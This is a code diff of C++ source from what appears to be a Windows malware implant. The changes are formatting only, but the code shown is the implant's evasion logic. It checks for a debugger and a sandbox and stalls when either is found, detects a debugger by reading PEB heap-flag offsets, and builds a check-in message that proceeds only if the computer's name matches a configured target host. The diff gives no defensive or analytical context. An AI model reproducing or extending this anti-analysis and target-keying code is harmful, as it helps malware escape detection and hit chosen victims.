@@ -5,9 +5,9 @@ namespace Opsec {
 
         bool success = true;
 #ifndef DEBUG
-        if (Opsec::CheckDebugger()) { Utils::Time::Timeout(MINUTES(1)); success_(false); }
+        if (CheckDebugger()) { Utils::Time::Timeout(MINUTES(1)); success_(false); }
 #endif
-        if (Opsec::CheckSandbox()) { Utils::Time::Timeout(MINUTES(1)); success_(false); }
+        if (CheckSandbox()) { Utils::Time::Timeout(MINUTES(1)); success_(false); }
 
         defer:
         return success;
@@ -37,17 +37,15 @@ namespace Opsec {
         PPEB peb    = PEB_POINTER;
         BOOL m_x32  = FALSE;
 
-        PVOID   heap_base               = { };
-        ULONG   flags_offset            = 0;
-        ULONG   force_flags_offset      = 0;
-        BOOL    vista_or_greater        = Ctx->session.version >= WIN_VERSION_2008;
+        PVOID heap_base             = { };
+        ULONG flags_offset          = 0;
+        ULONG force_flags_offset    = 0;
+        BOOL vista_or_greater       = Ctx->session.version >= WIN_VERSION_2008;
 
         Ctx->win32.IsWow64Process(NtCurrentProcess(), &m_x32);
 
 #if _WIN64
-        heap_base = !m_x32
-                    ? C_PTR(*RVA(ULONG_PTR*,peb, 0x18))
-                    : C_PTR(*RVA(ULONG_PTR*,peb, 0x1030));
+        heap_base = !m_x32 ? C_PTR(*RVA(ULONG_PTR*,peb, 0x18)) : C_PTR(*RVA(ULONG_PTR*,peb, 0x1030));
 
         flags_offset 		= vista_or_greater ? 0x40 : 0x0C;
         force_flags_offset 	= vista_or_greater ? 0x44 : 0x10;
@@ -59,7 +57,7 @@ namespace Opsec {
         auto HeapFlags      = RVA(ULONG_PTR*, heap_base, flags_offset);
         auto HeapForceFlags = RVA(ULONG_PTR*, heap_base, force_flags_offset);
 
-        return ((*HeapFlags & ~HEAP_GROWABLE) || (*HeapForceFlags != 0));
+        return *HeapFlags & ~HEAP_GROWABLE || *HeapForceFlags != 0;
     }
 
     BOOL CheckSandbox() {
@@ -75,12 +73,12 @@ namespace Opsec {
     BOOL CheckEnvironment() {
         // todo: add more information to the checkin message
 
-        _stream         *out    = Stream::CreateStreamWithHeaders(TypeCheckin);
+        _stream *out            = Stream::CreateStreamWithHeaders(TypeCheckin);
         IP_ADAPTER_INFO adapter = { };
 
-        unsigned long   length              = MAX_PATH;
-        char            buffer[MAX_PATH]    = { };
-        bool            success             = true;
+        unsigned long length    = MAX_PATH;
+        char buffer[MAX_PATH]   = { };
+        bool success            = true;
 
         if (Ctx->win32.GetComputerNameExA(ComputerNameNetBIOS, (LPSTR) buffer, &length)) {
             x_assertb(x_strncmp(Ctx->config.hostname, buffer, x_strlen(Ctx->config.hostname)) == 0);
